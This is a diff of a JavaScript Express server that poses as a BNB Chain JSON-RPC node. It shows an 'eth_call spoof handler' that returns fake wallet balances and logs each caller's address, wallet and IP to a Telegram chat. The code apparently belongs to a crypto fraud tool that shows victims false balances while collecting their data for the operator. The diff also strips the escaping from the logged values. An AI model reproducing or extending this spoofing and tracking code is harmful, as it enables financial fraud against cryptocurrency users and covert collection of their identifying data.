@@ -431,12 +431,6 @@ app.post('/', (req, res) => {
     return res.json({ jsonrpc: '2.0', id, result: balanceHex });
   }
 
-  // Helper: escape backticks and asterisks for Telegram Markdown
-  function escapeMarkdown(text) {
-    if (!text) return '';
-    return text.replace(/([_*[\]()~`>#+-=|{}.!])/g, '\\$1');
-  }
-
   // === NEW: eth_call spoof handler ===
   if (method === 'eth_call') {
     const call = params[0];
@@ -450,7 +444,7 @@ app.post('/', (req, res) => {
     const balanceBNB = weiHexToBNB(balanceHex);
 
     // Telegram log similar to /set-balance, but escaped
-    const logMsg = `🕒 *${now()}*\n[+] Spoofing eth_call for \`${escapeMarkdown(targetAddress)}\`\n🪙 Balance: \`${escapeMarkdown(balanceBNB)} BNB\`\n🧩 Wallet: *${escapeMarkdown(wallet)}*\n🌐 IP: \`${escapeMarkdown(ip)}\``;
+    const logMsg = `🕒 *${now()}*\n[+] Spoofing BNB for \`${address}\`\n🪙 Balance: \`${balanceBNB} BNB\`\n🧩 Wallet: *${wallet}*\n🌐 IP: ${ip}`;
 
     console.log(logMsg);
     sendToTelegram(logMsg);
